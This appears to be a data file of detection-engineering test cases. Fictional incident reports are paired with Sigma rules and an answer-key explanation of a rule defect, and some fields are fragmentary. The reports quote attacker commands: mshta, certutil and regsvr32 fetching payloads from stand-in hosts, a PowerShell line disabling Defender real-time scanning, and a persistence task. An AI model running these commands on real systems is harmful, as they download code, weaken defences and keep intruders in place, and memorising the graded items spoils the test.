evidence: executed an HTML application payload directly from the network
cases.report_text: Incident summary CRANEMAIL-114: the intrusion set we track as Marsh Heron sent invoice-themed emails to finance staff at a regional logistics firm. After the recipient enabled content in the attachment, a child process reached out to the staging host files.cranemail.test and executed an HTML application payload directly from the network. Responders recovered the following command from endpoint telemetry: mshta.exe https://files.cranemail.test/portal/invoice.hta. The HTA file contained a short VBScript stub that wrote a loader to the user's profile and launched it. No additional switches or wrapper scripts were present on the command line. Analysts assess that the operators prefer living-off-the-land binaries because they blend in with ordinary Office activity. The hosting domain was registered nine days before the first email was seen.
cases.sigma_yaml:
title: Mshta Loading Remote HTA From Word
id: 7c1e4a52-3b0d-4f6a-9e21-5d8a0c3b7f14
status: experimental
description: Detects mshta.exe started by winword.exe that loads a remote HTA payload over HTTP or HTTPS.
references:
  - urn:atidep:case
author: case-author
date: 2026/10/02
tags:
  - attack.stealth
  - attack.t1218.005
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\mshta.exe'
    ParentImage|endswith: '\winword.exe'
    CommandLine|contains|all:
      - 'http'
      - '.hta'
  condition: selection
falsepositives:
  - Internal line-of-business applications delivered as remote HTA files
level: high
cases.why: The rule requires ParentImage to end with winword.exe, but that process name appears nowhere in the report text or in either evidence quotation, and no assumption covers it. The other values (mshta.exe, http, .hta) are quoted, so the unsupported parent-process value is the only defect.

cases.report_text: Hosts compromised in the Quillfeather campaign showed a consistent staging step. Immediately after initial access, the operator used the built-in certificate utility to retrieve a second-stage binary from infrastructure at stage.cranemail.test. Endpoint telemetry captured the full command line as certutil.exe -urlcache -split -f http://stage.cranemail.test/pack/updsvc.bin C:\Users\Public\updsvc.bin on every affected host. The downloaded file was then renamed with an .exe extension and executed from the Public profile directory. Retrieval took place within minutes of the first interactive logon, and no antivirus alert was raised at the time. The behaviour matches the abuse of a trusted Windows utility as a download proxy, a pattern the team has seen in earlier intrusions against the same sector.

cases.report_text: During the Saltmarsh intrusion, the operators weakened endpoint protection shortly after obtaining administrative access, before dropping their remote access tooling. Responders recovered process-creation records showing PowerShell used to change Microsoft Defender preferences. The relevant invocation was powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring $true, run from a scheduled maintenance script on the file server. The change persisted until the next policy refresh, giving the operators roughly forty minutes of reduced scanning. The Defender operational log recorded the preference change, but no alert was forwarded to the monitoring team. We recommend alerting on attempts to turn off real-time scanning through PowerShell, since legitimate administrators normally manage these settings through central policy rather than ad hoc commands on a server.

assumptions.justification: Scriptlet loaders of this kind are routinely hosted on plain HTTP infrastructure; the report documents only an HTTPS instance.
assumptions.statement: The loader may also be staged over plain HTTP on alternate hosts, and it is paired with the standard script component runtime library scrobj.dll.

evidence: pointed at a scriptlet hosted on sync.cranemail.test
cases.report_text: Telemetry from the Ironpine intrusion shows the actor using regsvr32.exe as a proxy to run remote script content on engineering workstations. The binary was started by a short-lived command shell and pointed at a scriptlet hosted on sync.cranemail.test. Because the process audit record was truncated, responders could only reconstruct the leading part of the call as regsvr32.exe /s /n /u /i:https://sync.cranemail.test/cdn/update.sct, which loads the remote file without registering anything on disk. The scriptlet in turn launched a staged loader from the user's temporary directory. Since the request goes out over HTTPS from a signed Windows binary, perimeter controls did not flag it. Our recommendation is a process-creation detection that keys on the remote scriptlet being passed on the command line, as the technique leaves little other trace on the host.
cases.sigma_yaml:

id: e05a7b31-6d84-4a29-9c17-2f3b8e4d1a56

The other values are supported by the quotation or by the covers list.

evidence: the implant connected to 203.0.113.77 on TCP port 8443 at intervals of roughly sixty seconds
The port is not associated with any approved business application in the affected subnet.
cases.report_text: Network telemetry from the Larkspur incident shows an implant beaconing to a single external address over a non-standard port. Every outbound session in the sample used the same destination: the implant connected to 203.0.113.77 on TCP port 8443 at intervals of roughly sixty seconds, sending short fixed-size requests and receiving small replies. The port is not associated with any approved business application in the affected subnet. The connections originated from a script host process launched through the user's startup items, which explains why the activity resumed after each reboot. No domain name was used; the operators addressed the server by IP only, which suggests the infrastructure was provisioned for short-term use and will rotate quickly.

evidence: lookups for generated subdomains of telemetry-sync.example-cdn.test, for example a1b2c3d4e5.telemetry-sync.example-cdn.test
cases.report_text: Resolver and endpoint telemetry from the Driftwood case describe DNS-based command and control from a user workstation. A loader executed through rundll32.exe issued a steady stream of lookups for generated subdomains of telemetry-sync.example-cdn.test, for example a1b2c3d4e5.telemetry-sync.example-cdn.test, with the subdomain label carrying encoded task data. Lookups occurred every few minutes and were answered with short responses relayed through the recursive resolver. No other process on the host queried the domain. The domain has no legitimate business use for the organisation and does not appear in any vendor allow list. Responders blocked it at the resolver on day three, after which the beaconing stopped. The campaign is assessed as low in sophistication but persistent.

cases.report_text: Persistence in the Tidewater intrusion relied on a scheduled task created from a command shell on a jump server. The operators registered a task named OneDriveSyncHelper that executes a renamed payload from the Public profile every five minutes. Responders recovered the creation command from process telemetry: schtasks.exe /create /tn OneDriveSyncHelper /sc minute /mo 5 /tr C:\Users\Public\Libraries\syncsvc.exe. The task survived reboots and was re-created by the operators when administrators removed it on the second day. The payload path sits in a directory that is writable by all local users, which is common for commodity loaders. No scheduled task with this name appears in the software inventory for the server, and the host's change records contain no corresponding request.
cases.sigma_yaml:

references:
